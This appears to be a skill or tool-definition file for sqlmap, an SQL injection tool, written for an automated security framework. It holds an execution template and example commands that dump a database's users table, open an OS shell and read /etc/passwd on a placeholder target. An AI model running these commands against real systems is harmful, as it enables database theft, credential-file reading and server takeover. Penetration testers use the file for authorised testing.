---
id: security-web-sqlmap
namespace: security:web:sqlmap
name: sqlmap
description: Automatic SQL injection detection and exploitation tool with support for all major DBMS and injection techniques.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - web.injection.sql
  - web.exploitation.database
  - web.discovery.sqli
  - security.exploit.sqli
platforms:
  - linux
  - macos
  - cross-platform
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies:
  - python3
related_tools:
  - ghauri
  - commix
  - sqlninja
artifacts:
  - type: web.exploit.sqli.dump
    description: Extracted database contents
    mime: text/plain
    trust_level: verified
  - type: web.exploit.sqli.session
    description: SQLMap session file
    mime: application/octet-stream
    trust_level: verified
workflow_edges:
  produces:
    - sqli-results
    - database-dump
    - os-shell
  consumes:
    - target-url
contract:
  inputs:
    - type: web.target.url
      description: Target URL with injectable parameter
    - type: web.injection.data
      description: POST data string
  outputs:
    - type: web.injection.sqli.results
      description: SQL injection test results
      mime: text/plain
    - type: web.exploit.data
      description: Extracted data
      mime: text/plain
  side_effects:
    - network_traffic
    - filesystem_write
  resource_cost:
    cpu: high
    memory_mb: 256
    network: medium
    disk_io: medium
resource_profile:
  cpu: high
  memory_mb: 256
  network: medium
  disk_io: medium
allowed-tools:
  - sqlmap
  - Bash
  - execFile
parameters:
  - name: url
    type: string
    required: true
    description: "Target URL (-u)"
    aliases:
      - -u
  - name: data
    type: string
    required: false
    description: "POST data string (--data)"
    aliases:
      - --data
  - name: cookie
    type: string
    required: false
    description: "HTTP Cookie header (--cookie)"
    aliases:
      - --cookie
  - name: level
    type: integer
    required: false
    description: "Level of tests to perform 1-5 (--level)"
    default_value: "1"
    aliases:
      - --level
  - name: risk
    type: integer
    required: false
    description: "Risk of tests 1-3 (--risk)"
    default_value: "1"
    aliases:
      - --risk
  - name: dbms
    type: string
    required: false
    description: "Force back-end DBMS type (--dbms)"
    aliases:
      - --dbms
  - name: technique
    type: string
    required: false
    description: "SQL injection techniques to use (--technique)"
    default_value: "BEUSTQ"
    aliases:
      - --technique
  - name: batch
    type: boolean
    required: false
    description: "Never ask for user input (--batch)"
    aliases:
      - --batch
  - name: dump
    type: boolean
    required: false
    description: "Dump DBMS database table entries (--dump)"
    aliases:
      - --dump
  - name: tables
    type: boolean
    required: false
    description: "Enumerate DBMS database tables (--tables)"
    aliases:
      - --tables
  - name: columns
    type: boolean
    required: false
    description: "Enumerate DBMS database table columns (--columns)"
    aliases:
      - --columns
  - name: dbs
    type: boolean
    required: false
    description: "Enumerate DBMS databases (--dbs)"
    aliases:
      - --dbs
  - name: os-shell
    type: boolean
    required: false
    description: "Prompt for an interactive O/S shell (--os-shell)"
    aliases:
      - --os-shell
  - name: proxy
    type: string
    required: false
    description: "Proxy URL (--proxy)"
    aliases:
      - --proxy
  - name: threads
    type: integer
    required: false
    description: "Number of threads (--threads)"
    default_value: "1"
    aliases:
      - --threads
execution:
  template: "sqlmap -u {target} --batch --level {level} --risk {risk}"
  sandbox: execFile
  timeout_seconds: 900
  shell: false
global_vars:
  target: url
  level: "1"
  risk: "1"
examples:
  - description: "Basic SQL injection detection"
    command: sqlmap -u "http://target.com/page?id=1" --batch
  - description: "Enumerate databases"
    command: sqlmap -u "http://target.com/page?id=1" --dbs --batch
  - description: "Dump specific database"
    command: sqlmap -u "http://target.com/page?id=1" -D database_name --dump --batch
  - description: "Get OS shell"
    command: sqlmap -u "http://target.com/page?id=1" --os-shell --batch
  - description: "With POST data and cookie"
    command: sqlmap -u "http://target.com/login" --data "user=admin&pass=test" --cookie "PHPSESSID=abc123" --batch
references:
  - label: "SQLMap GitHub"
    url: "https://github.com/sqlmapproject/sqlmap"
  - label: "SQLMap documentation"
    url: "https://sqlmap.org/"
phase: exploitation
techniques:
  - execution
  - execution
  - enumeration
items:
  - NoCreds
services: []
attack_types:
  - Exploitation
install:
    - method: apt
      package_name: "sqlmap"
      commands:
        - "apt-get install -y sqlmap"
---

# SQLMap — Automatic SQL Injection Tool

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.

## Basic Detection

```bash
# Simple GET parameter test
sqlmap -u "http://target.com/page?id=1" --batch

# POST data test
sqlmap -u "http://target.com/login" --data "user=admin&pass=test" --batch
```

## Enumeration

```bash
# List databases
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# List tables in a database
sqlmap -u "http://target.com/page?id=1" -D database_name --tables --batch

# Dump table contents
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump --batch
```

## Exploitation

```bash
# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

# Read file from server
sqlmap -u "http://target.com/page?id=1" --file-read "/etc/passwd" --batch
```
